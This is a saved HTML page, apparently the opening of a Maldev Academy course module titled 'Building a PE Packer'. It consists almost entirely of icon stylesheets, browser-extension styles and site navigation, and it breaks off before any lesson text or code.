f242"}.fa-battery-1:before,.fa-battery-quarter:before{content:"\f243"}.fa-battery-0:before,.fa-battery-empty:before{content:"\f244"}.fa-mouse-pointer:before{content:"\f245"}.fa-i-cursor:before{content:"\f246"}.fa-object-group:before{content:"\f247"}.fa-object-ungroup:before{content:"\f248"}.fa-sticky-note:before{content:"\f249"}.fa-sticky-note-o:before{content:"\f24a"}.fa-cc-jcb:before{content:"\f24b"}.fa-cc-diners-club:before{content:"\f24c"}.fa-clone:before{content:"\f24d"}.fa-balance-scale:before{content:"\f24e"}.fa-hourglass-o:before{content:"\f250"}.fa-hourglass-1:before,.fa-hourglass-start:before{content:"\f251"}.fa-hourglass-2:before,.fa-hourglass-half:before{content:"\f252"}.fa-hourglass-3:before,.fa-hourglass-end:before{content:"\f253"}.fa-hourglass:before{content:"\f254"}.fa-hand-grab-o:before,.fa-hand-rock-o:before{content:"\f255"}.fa-hand-stop-o:before,.fa-hand-paper-o:before{content:"\f256"}.fa-hand-scissors-o:before{content:"\f257"}.fa-hand-lizard-o:before{content:"\f258"}.fa-hand-spock-o:before{content:"\f259"}.fa-hand-pointer-o:before{content:"\f25a"}.fa-hand-peace-o:before{content:"\f25b"}.fa-trademark:before{content:"\f25c"}.fa-registered:before{content:"\f25d"}.fa-creative-commons:before{content:"\f25e"}.fa-gg:before{content:"\f260"}.fa-gg-circle:before{content:"\f261"}.fa-tripadvisor:before{content:"\f262"}.fa-odnoklassniki:before{content:"\f263"}.fa-odnoklassniki-square:before{content:"\f264"}.fa-get-pocket:before{content:"\f265"}.fa-wikipedia-w:before{content:"\f266"}.fa-safari:before{content:"\f267"}.fa-chrome:before{content:"\f268"}.fa-firefox:before{content:"\f269"}.fa-opera:before{content:"\f26a"}.fa-internet-explorer:before{content:"\f26b"}.fa-tv:before,.fa-television:before{content:"\f26c"}.fa-contao:before{content:"\f26d"}.fa-500px:before{content:"\f26e"}.fa-amazon:before{content:"\f270"}.fa-calendar-plus-o:before{content:"\f271"}.fa-calendar-minus-o:before{content:"\f272"}.fa-calendar-times-o:before{content:"\f273"}.fa-calendar-check-o:before{content:"\f274"}.fa-industry:before{content:"\f275"}.fa-map-pin:before{content:"\f276"}.fa-map-signs:before{content:"\f277"}.fa-map-o:before{content:"\f278"}.fa-map:before{content:"\f279"}.fa-commenting:before{content:"\f27a"}.fa-commenting-o:before{content:"\f27b"}.fa-houzz:before{content:"\f27c"}.fa-vimeo:before{content:"\f27d"}.fa-black-tie:before{content:"\f27e"}.fa-fonticons:before{content:"\f280"}.fa-reddit-alien:before{content:"\f281"}.fa-edge:before{content:"\f282"}.fa-credit-card-alt:before{content:"\f283"}.fa-codiepie:before{content:"\f284"}.fa-modx:before{content:"\f285"}.fa-fort-awesome:before{content:"\f286"}.fa-usb:before{content:"\f287"}.fa-product-hunt:before{content:"\f288"}.fa-mixcloud:before{content:"\f289"}.fa-scribd:before{content:"\f28a"}.fa-pause-circle:before{content:"\f28b"}.fa-pause-circle-o:before{content:"\f28c"}.fa-stop-circle:before{content:"\f28d"}.fa-stop-circle-o:before{content:"\f28e"}.fa-shopping-bag:before{content:"\f290"}.fa-shopping-basket:before{content:"\f291"}.fa-hashtag:before{content:"\f292"}.fa-bluetooth:before{content:"\f293"}.fa-bluetooth-b:before{content:"\f294"}.fa-percent:before{content:"\f295"}.fa-gitlab:before{content:"\f296"}.fa-wpbeginner:before{content:"\f297"}.fa-wpforms:before{content:"\f298"}.fa-envira:before{content:"\f299"}.fa-universal-access:before{content:"\f29a"}.fa-wheelchair-alt:before{content:"\f29b"}.fa-question-circle-o:before{content:"\f29c"}.fa-blind:before{content:"\f29d"}.fa-audio-description:before{content:"\f29e"}.fa-volume-control-phone:before{content:"\f2a0"}.fa-braille:before{content:"\f2a1"}.fa-assistive-listening-systems:before{content:"\f2a2"}.fa-asl-interpreting:before,.fa-american-sign-language-interpreting:before{content:"\f2a3"}.fa-deafness:before,.fa-hard-of-hearing:before,.fa-deaf:before{content:"\f2a4"}.fa-glide:before{content:"\f2a5"}.fa-glide-g:before{content:"\f2a6"}.fa-signing:before,.fa-sign-language:before{content:"\f2a7"}.fa-low-vision:before{content:"\f2a8"}.fa-viadeo:before{content:"\f2a9"}.fa-viadeo-square:before{content:"\f2aa"}.fa-snapchat:before{content:"\f2ab"}.fa-snapchat-ghost:before{content:"\f2ac"}.fa-snapchat-square:before{content:"\f2ad"}.fa-pied-piper:before{content:"\f2ae"}.fa-first-order:before{content:"\f2b0"}.fa-yoast:before{content:"\f2b1"}.fa-themeisle:before{content:"\f2b2"}.fa-google-plus-circle:before,.fa-google-plus-official:before{content:"\f2b3"}.fa-fa:before,.fa-font-awesome:before{content:"\f2b4"}.fa-handshake-o:before{content:"\f2b5"}.fa-envelope-open:before{content:"\f2b6"}.fa-envelope-open-o:before{content:"\f2b7"}.fa-linode:before{content:"\f2b8"}.fa-address-book:before{content:"\f2b9"}.fa-address-book-o:before{content:"\f2ba"}.fa-vcard:before,.fa-address-card:before{content:"\f2bb"}.fa-vcard-o:before,.fa-address-card-o:before{content:"\f2bc"}.fa-user-circle:before{content:"\f2bd"}.fa-user-circle-o:before{content:"\f2be"}.fa-user-o:before{content:"\f2c0"}.fa-id-badge:before{content:"\f2c1"}.fa-drivers-license:before,.fa-id-card:before{content:"\f2c2"}.fa-drivers-license-o:before,.fa-id-card-o:before{content:"\f2c3"}.fa-quora:before{content:"\f2c4"}.fa-free-code-camp:before{content:"\f2c5"}.fa-telegram:before{content:"\f2c6"}.fa-thermometer-4:before,.fa-thermometer:before,.fa-thermometer-full:before{content:"\f2c7"}.fa-thermometer-3:before,.fa-thermometer-three-quarters:before{content:"\f2c8"}.fa-thermometer-2:before,.fa-thermometer-half:before{content:"\f2c9"}.fa-thermometer-1:before,.fa-thermometer-quarter:before{content:"\f2ca"}.fa-thermometer-0:before,.fa-thermometer-empty:before{content:"\f2cb"}.fa-shower:before{content:"\f2cc"}.fa-bathtub:before,.fa-s15:before,.fa-bath:before{content:"\f2cd"}.fa-podcast:before{content:"\f2ce"}.fa-window-maximize:before{content:"\f2d0"}.fa-window-minimize:before{content:"\f2d1"}.fa-window-restore:before{content:"\f2d2"}.fa-times-rectangle:before,.fa-window-close:before{content:"\f2d3"}.fa-times-rectangle-o:before,.fa-window-close-o:before{content:"\f2d4"}.fa-bandcamp:before{content:"\f2d5"}.fa-grav:before{content:"\f2d6"}.fa-etsy:before{content:"\f2d7"}.fa-imdb:before{content:"\f2d8"}.fa-ravelry:before{content:"\f2d9"}.fa-eercast:before{content:"\f2da"}.fa-microchip:before{content:"\f2db"}.fa-snowflake-o:before{content:"\f2dc"}.fa-superpowers:before{content:"\f2dd"}.fa-wpexplorer:before{content:"\f2de"}.fa-meetup:before{content:"\f2e0"}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0, 0, 0, 0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}</style><style class="darkreader darkreader--sync" media="screen"></style>
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="31_files/css2.css" rel="stylesheet">
        <link href="31_files/css2_002.css" rel="stylesheet">
        <title>Building a PE Packer</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="31_files/app-CuOUn2oZ.css"><link rel="stylesheet" href="31_files/app-CuOUn2oZ.css"><style class="darkreader darkreader--sync" media="screen"></style><link href="31_files/prism-coldark-dark.css" rel="stylesheet"><style class="darkreader darkreader--sync" media="screen"></style>

<link rel="stylesheet" href="31_files/viewer.css"><style class="darkreader darkreader--sync" media="screen"></style>
    <meta name="darkreader" content="1adb5410fea646e0a1c682221feb2614"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: var(--darkreader-background-ffd76e, #684b00) !important;
    border-color: var(--darkreader-background-c59d00, #9e7e00) !important;
    color: var(--darkreader-text-302505, #d7d4cf) !important;
}
#vimvixen-console-frame {
    color-scheme: light !important;
}
::placeholder {
    opacity: 0.5 !important;
}
#edge-translate-panel-body,
.MuiTypography-body1,
.nfe-quote-text {
    color: var(--darkreader-neutral-text) !important;
}
gr-main-header {
    background-color: var(--darkreader-background-add8e6, #1b4958) !important;
}
.tou-z65h9k,
.tou-mignzq,
.tou-1b6i2ox,
.tou-lnqlqk {
    background-color: var(--darkreader-neutral-background) !important;
}
.tou-75mvi {
    background-color: var(--darkreader-background-cfecf5, #0f3a47) !important;
}
.tou-ta9e87,
.tou-1w3fhi0,
.tou-1b8t2us,
.tou-py7lfi,
.tou-1lpmd9d,
.tou-1frrtv8,
.tou-17ezmgn {
    background-color: var(--darkreader-background-f5f5f5, #1e2021) !important;
}
.tou-uknfeu {
    background-color: var(--darkreader-background-faedda, #432c09) !important;
}
.tou-6i3zyv {
    background-color: var(--darkreader-background-85c3d8, #245d70) !important;
}
div.mermaid-viewer-control-panel .btn {
    background-color: var(--darkreader-neutral-background);
    fill: var(--darkreader-neutral-text);
}
svg g rect.er {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.entityBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxOdd {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxEven {
    fill: var(--darkreader-selection-background);
    fill-opacity: 0.8 !important;
}
svg rect.er.relationshipLabelBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g g.nodes rect,
svg g g.nodes polygon {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.task {
    fill: var(--darkreader-selection-background) !important;
}
svg line.messageLine0,
svg line.messageLine1 {
    stroke: var(--darkreader-neutral-text) !important;
}
div.mermaid .actor {
    fill: var(--darkreader-neutral-background) !important;
}
mitid-authenticators-code-app > .code-app-container {
    background-color: white !important;
    padding-top: 1rem;
}
iframe#unpaywall[src$="unpaywall.html"] {
    color-scheme: light !important;
}
select {
    --darkreader-bg--form-control-background-color: rgba(22, 22, 22, 0) !important;
}
select * {
    background-color: var(--darkreader-neutral-background) !important;
}
body#tumblr {
    --darkreader-bg--secondary-accent: 31, 32, 34 !important;
    --darkreader-bg--white: 23, 23, 23 !important;
    --darkreader-text--black: 228, 224, 218 !important;
}
:host {
    --d2l-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-button-icon-background-color-hover: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-color-ferrite: var(--darkreader-neutral-text) !important;
    --d2l-color-sylvite: var(--darkreader-bg--d2l-color-sylvite) !important;
    --d2l-dropdown-background-color: var(--darkreader-neutral-background) !important;
    --d2l-dropdown-border-color: var(--darkreader-border--d2l-color-mica) !important;
    --d2l-input-backgroud-color: var(--darkreader-neutral-background) !important;
    --d2l-menu-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-tooltip-background-color: var(--darkreader-neutral-background) !important;
    --d2l-tooltip-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
:host([_floating]) .d2l-floating-buttons-container {
    background-color: var(--darkreader-neutral-background) !important;
    border-top-color: var(--darkreader-border--d2l-color-mica) !important;
    opacity: 0.88 !important;
}
d2l-card {
    background: var(--darkreader-neutral-background) !important;
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
d2l-dropdown-content > div,
d2l-menu-item {
    background-color: var(--darkreader-neutral-background) !important;
    border-radius: 10px !important;
}
d2l-empty-state-simple {
    border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-button-filter > ul > li > a.vui-button {
    border-color: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-label-text:has(.d2l-button-subtle-content):hover,
.d2l-label-text:has(.d2l-button-subtle-content):focus,
.d2l-label-text:has(.d2l-button-subtle-content):active {
    background-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-navigation-centerer {
    color: inherit !important;
}
.d2l-tabs-layout {
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
.d2l-input,
.d2l-calendar-date,
.d2l-htmleditor-container {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-collapsible-panel {
    border: 1px solid var(--darkreader-border--d2l-color-mica) !important;
    border-radius: 0.4rem !important;
}
.d2l-collapsible-panel-divider {
    border-bottom: 1px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-w2d-flex {
    border-bottom: 2px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-collapsible-panel scrolled,
.d2l-collapsible-panel-header,
.d2l-w2d-collection-fixed {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-loading-spinner-bg {
    fill: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-loading-spinner-bg-stroke {
    stroke: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-loading-spinner-wrapper svg path,
.d2l-loading-spinner-wrapper svg circle {
    fill: var(--darkreader-neutral-background) !important;
}
embed[type="application/pdf"] { filter: invert(100%) contrast(90%); }</style><style>.base-arrow-GfAHTK {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAyCAYAAACtd6CrAAAACXBIWXMAAC4jAAAuIwF4pT92AAAC9ElEQVR4nL2YSWtUQRSFS23nhRsXgmsFE/+AmwRFURQnRMURdSMSp2iCnXQwA3ZMSIKJRMRNHFDEefaXqP/An2Ack/Yc320pz+skPdx44TSv3ynq49Z7r+pWZerr1qwLIdyFVkA3oPYPHz8VwixEBroDrbL/WWjZ2vq6ptkAErZS7p2CJgE84w0k7BZ0Qe43QQUAz3oCCWuFlkNHxTsNTQDY7AXMoCMO2Qlcz4GOiH8OIqjZBcYfAJnBcVzOgw5Km/PwJtCmxQUWATmUzPCAtLsIr4A2rS4wAc6F9kvbFssw6wIz4C90ejgkGe4T+5Jl2OYCi4CHQvIM94idhTeJNjkXWATks3sE7Ra73TLscIEZ8Cc65bN7DO0SO2fPsNMFJsAn0A6xL9uQdrvADPgDne7F5VNou9hdNqQ9LjABPoO2id1tQ5p3gRnwOzrl2/kc2ir2Fcuw1wUmwBfQFrHzlmG/C8yA39ApP4eX0Gax+ww46AIT4Ctok9gDNqRDLjADfkWnO3H5Gtoo9qBlOOwCE+AbaIPY1yzDEReYAcfRKb+/t9D6EkBmOOoCE+A7qDGyuHpchzfuBjPgF3TKD/491CDAq66wmcIVhqyWhmQYG8Ri0dTmBgNoSUjeyEaxCGL9OeYCi0D6JjJYd47yomYYQItDMovoN1YEjRT/1ASLQDp7MFri2aMmGECLQjLz67zIaNV5sWpYBNIZn5EtNeNXBQNoYUhWa13LGLmp1rKKYRFIV2lGx3SrdEUwgBaEpMLS+oPROVP9UTYsAmllxegqp7IqCwbQ/JBUxVozMnrKrRlnhEUgrYYZ+Uqq4WlhANF7GNJ1PqO30jp/SpiBHoT0DobRV80OpiTMQPdDem/G6K92b5aCAcT92L2Q3nUyBmvZdf4Di0C6n2YM1bqf/gsz0O2QPilgDHucFPyBAcTN+lhIn4EwuBbp6U/1MGggpE93GFxd3U53irCTJe7zKND13KoI+wytju7dhNxP5IqwY+E/HW7+BpJoVXj80aQPAAAAAElFTkSuQmCC);
  width: 16px;
  height: 16px;
  position: absolute;
  top: 16px;
  left: 16px;
  cursor: pointer;
  background-size: contain;
  background-repeat: no-repeat;
}
.base-navigation-tab-Ahvn3N {
  width: 24px;
  height: 24px;
  background-position: center;
  background-repeat: no-repeat;
  background-size: contain;
}
.base-navigation-label-vUENtU {
  font-family: 'Inter', sans-serif;
  font-size: 13px;
  line-height: 18px;
  color: rgba(0, 0, 0, 0.87);
}
.shoop-de-tooltip-rXf0XP {
  position: relative;
}
.shoop-de-tooltip__text-block-VXptk_ {
  height: 136px;
  background: #e35144;
  position: absolute;
  top: -148px;
  width: 302px;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Inter', sans-serif;
  font-style: normal;
  font-size: 15px;
  line-height: 21px;
  font-weight: normal;
  letter-spacing: -0.24px;
  color: #FFF;
  display: flex;
  align-items: flex-end;
}
.shoop-de-tooltip__polygon-a7JmmB {
  position: absolute;
  width: 15px;
  height: 15px;
  top: -20px;
  left: 17px;
  border-radius: 2px;
  transform: rotate(45deg);
  background: #e35144;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><style>.shoop-de-serp-beA_vX {
  z-index: 999999999999;
  width: max-content;
  font-size: 15px;
  line-height: 21px;
  font-weight: bold;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  cursor: pointer;
}
.shoop-de-serp-beA_vX:hover .shoop-de-serp__tooltip-jznGdA {
  opacity: 1;
}
.shoop-de-serp__logo-VNEyj1 {
  width: 30px;
  height: 20px;
  background: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yOC42NTg4IDYuNjUwMjFDMjMuODkxIDYuNjUwMjEgMTkuODUyMyA5Ljc3MTY0IDE4LjQ3NDggMTQuMDgyNEMxNi41NjQ4IDEyLjI5OSAxNC4wMDA0IDExLjIwNzUgMTEuMTgxMSAxMS4yMDc1QzUuMjc3NSAxMS4yMDc1IDAuNDkxNzkgMTUuOTkzMiAwLjQ5MTc5IDIxLjg5NjhDMC40OTE3OSAyNy44MDA0IDUuMjc3NSAzMi41ODYxIDExLjE4MTEgMzIuNTg2MUMxNS45NDg5IDMyLjU4NjEgMTkuOTg3NiAyOS40NjQ2IDIxLjM2NTEgMjUuMTUzOEMyMy4yNzUgMjYuOTM3MyAyNS44Mzk0IDI4LjAyODggMjguNjU4OCAyOC4wMjg4QzM0LjU2MjQgMjguMDI4OCAzOS4zNDgxIDIzLjI0MzEgMzkuMzQ4MSAxNy4zMzk1QzM5LjM0ODEgMTEuNDM1OSAzNC41NjI0IDYuNjUwMjEgMjguNjU4OCA2LjY1MDIxWk0yOC42NTg4IDIyLjI5NTJDMjUuOTIxNyAyMi4yOTUyIDIzLjcwMzEgMjAuMDc2NiAyMy43MDMxIDE3LjMzOTVDMjMuNzAzMSAxNC42MDI0IDI1LjkyMTcgMTIuMzgzOCAyOC42NTg4IDEyLjM4MzhDMzEuMzk1OSAxMi4zODM4IDMzLjYxNDUgMTQuNjAyNCAzMy42MTQ1IDE3LjMzOTVDMzMuNjE0NSAyMC4wNzY2IDMxLjM5NTkgMjIuMjk1MiAyOC42NTg4IDIyLjI5NTJaTTExLjE4MTEgMjYuODUyNUM4LjQ0MzkzIDI2Ljg1MjUgNi4yMjUzNiAyNC42MzM5IDYuMjI1MzYgMjEuODk2OEM2LjIyNTM2IDE5LjE1OTYgOC40NDM5MyAxNi45NDExIDExLjE4MTEgMTYuOTQxMUMxMy45MTgyIDE2Ljk0MTEgMTYuMTM2OCAxOS4xNTk2IDE2LjEzNjggMjEuODk2OEMxNi4xMzY4IDI0LjYzMzkgMTMuOTE4MiAyNi44NTI1IDExLjE4MTEgMjYuODUyNVoiIGZpbGw9IiMxRDdCQ0UiLz4KPC9zdmc+Cg==) no-repeat;
  background-size: contain;
}
.shoop-de-serp__premium-ZDFq9y {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTggMC42NjY2NTZDNy4wNjAyNyAwLjY2NjY1NiA2LjI4NTcxIDEuNDU3MzUgNi4yODU3MSAyLjQxNjY2QzYuMjg1NzEgMy4wNzI5MSA2LjY0NzMyIDMuNjQ5NCA3LjE3ODU3IDMuOTQ3OTFMNS41IDcuMzc0OTlMMi44NzUgNS40NjA5M0MzLjIxODc1IDUuMTM5NjQgMy40Mjg1NyA0LjY3NDc5IDMuNDI4NTcgNC4xNjY2NkMzLjQyODU3IDMuMjA3MzUgMi42NTQwMiAyLjQxNjY2IDEuNzE0MjkgMi40MTY2NkMwLjc3NDU1NCAyLjQxNjY2IDAgMy4yMDczNSAwIDQuMTY2NjZDMCA0Ljk1Mjc5IDAuNTI5MDE4IDUuNjA2NzYgMS4yMzIxNCA1LjgyNTUxTDIuMjg1NzEgMTEuNzVWMTQuNjY2N0gxMy43MTQzVjExLjc1TDE0Ljc2NzkgNS44MjU1MUMxNS40NzEgNS42MDY3NiAxNiA0Ljk1Mjc5IDE2IDQuMTY2NjZDMTYgMy4yMDczNSAxNS4yMjU0IDIuNDE2NjYgMTQuMjg1NyAyLjQxNjY2QzEzLjM0NiAyLjQxNjY2IDEyLjU3MTQgMy4yMDczNSAxMi41NzE0IDQuMTY2NjZDMTIuNTcxNCA0LjY3NDc5IDEyLjc4MTMgNS4xMzk2NCAxMy4xMjUgNS40NjA5M0wxMC41IDcuMzc0OTlMOC44MjE0MyAzLjk0NzkxQzkuMzUyNjggMy42NDk0IDkuNzE0MjkgMy4wNzI5MSA5LjcxNDI5IDIuNDE2NjZDOS43MTQyOSAxLjQ1NzM1IDguOTM5NzMgMC42NjY2NTYgOCAwLjY2NjY1NlpNOCAxLjgzMzMyQzguMzIxNDMgMS44MzMzMiA4LjU3MTQzIDIuMDg4NTMgOC41NzE0MyAyLjQxNjY2QzguNTcxNDMgMi43NDQ3OCA4LjMyMTQzIDIuOTk5OTkgOCAyLjk5OTk5QzcuNjc4NTcgMi45OTk5OSA3LjQyODU3IDIuNzQ0NzggNy40Mjg1NyAyLjQxNjY2QzcuNDI4NTcgMi4wODg1MyA3LjY3ODU3IDEuODMzMzIgOCAxLjgzMzMyWk0xLjcxNDI5IDMuNTgzMzJDMi4wMzU3MSAzLjU4MzMyIDIuMjg1NzEgMy44Mzg1MyAyLjI4NTcxIDQuMTY2NjZDMi4yODU3MSA0LjQ5NDc4IDIuMDM1NzEgNC43NDk5OSAxLjcxNDI5IDQuNzQ5OTlDMS4zOTI4NiA0Ljc0OTk5IDEuMTQyODYgNC40OTQ3OCAxLjE0Mjg2IDQuMTY2NjZDMS4xNDI4NiAzLjgzODUzIDEuMzkyODYgMy41ODMzMiAxLjcxNDI5IDMuNTgzMzJaTTE0LjI4NTcgMy41ODMzMkMxNC42MDcxIDMuNTgzMzIgMTQuODU3MSAzLjgzODUzIDE0Ljg1NzEgNC4xNjY2NkMxNC44NTcxIDQuNDk0NzggMTQuNjA3MSA0Ljc0OTk5IDE0LjI4NTcgNC43NDk5OUMxMy45NjQzIDQuNzQ5OTkgMTMuNzE0MyA0LjQ5NDc4IDEzLjcxNDMgNC4xNjY2NkMxMy43MTQzIDMuODM4NTMgMTMuOTY0MyAzLjU4MzMyIDE0LjI4NTcgMy41ODMzMlpNOCA0Ljg5NTgyTDkuNzY3ODYgOC41MDUyTDEwLjYyNSA4LjcyMzk1TDEzLjQ4MjEgNi42NDU4MkwxMi42Nzg2IDExLjE2NjdIMy4zMjE0M0wyLjUxNzg2IDYuNjQ1ODJMNS4zNzUgOC43MjM5NUw2LjIzMjE0IDguNTA1Mkw4IDQuODk1ODJaTTMuNDI4NTcgMTIuMzMzM0gxMi41NzE0VjEzLjVIMy40Mjg1N1YxMi4zMzMzWiIgZmlsbD0iIzYwNDVFMiIvPgo8L3N2Zz4K);
  width: 16px;
  height: 16px;
  margin-right: 10px;
}
.shoop-de-serp__description-pzXVxP {
  color: #1D7BCE;
  font-weight: 600;
}
.shoop-de-serp__container-HDQc_M {
  display: flex;
  width: 100%;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><meta name="shoop-toolbar" version="3.2.17.2"></head>
    <body>
        <nav id="navbar" class="w-full px-2 sm:px-0 z-40
    bg-[#101926] backdrop-blur-md sticky backdrop-saturate-150 border-b border-gray-700/50
     hidden">

    <div class="container flex flex-wrap md:flex-nowrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center block sm:block md:hidden lg:block">
            <img class="w-[100px] h-[60px]" src="31_files/maldev-navbar-logo.svg" alt="Logo">   
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto items-center" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 rounded-lg border md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 dark:border-gray-900">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/tools" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Public Tools</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>

          <li>
            <a data-target="_self" target="_blank" href="https://search.maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Maldev Database</a>
          </li>
                              <div class="group relative">
            <button id="profileNavBar" onclick="toggleProfileDropdown()" class="flex items-center justify-between w-full py-2 pl-3 pr-4 rounded md:border-0 md:p-0 md:w-auto text-gray-400">
              Account
              <svg class="w-2.5 h-2.5 ml-2.5" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4" style="--darkreader-inline-stroke: currentColor;" data-darkreader-inline-stroke=""></path>
              </svg>
            </button>
            <div id="profileDropdown" class="md:absolute hidden md:left-0 md:font-normal md:bg-white md:divide-y md:divide-gray-100 md:rounded-lg md:shadow md:w-44 md:dark:bg-gray-800 border-[1px] dark:border-gray-700 z-20">
              <ul class="py-2 text-sm text-gray-700 dark:text-gray-400">
                <li>
                  <a href="https://maldevacademy.com/profile" class="block px-4 py-2  hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white" target="_blank">Profile</a>
                </li>
                <li>
                <form action="https://maldevacademy.com/logout" method="POST" class="">
                </form>
                </li>
              </ul>
            </div>
          </div>
                                        <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/dashboard" class="text-white bg-blue-600/90 hover:bg-blue-500/80 border border-blue-400/40 shadow-md font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 transition-all duration-200 backdrop-blur-sm backdrop-saturate-150">
              Dashboard
            </a>
          </li>
                  </ul>
      </div>
    </div>
    
  </nav>        <template id="app-template">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="31_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 31 - Building a PE Packer
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="31_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="31_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="31_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="31_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="31_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/PePacker" target="_blank">
                    <img src="31_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
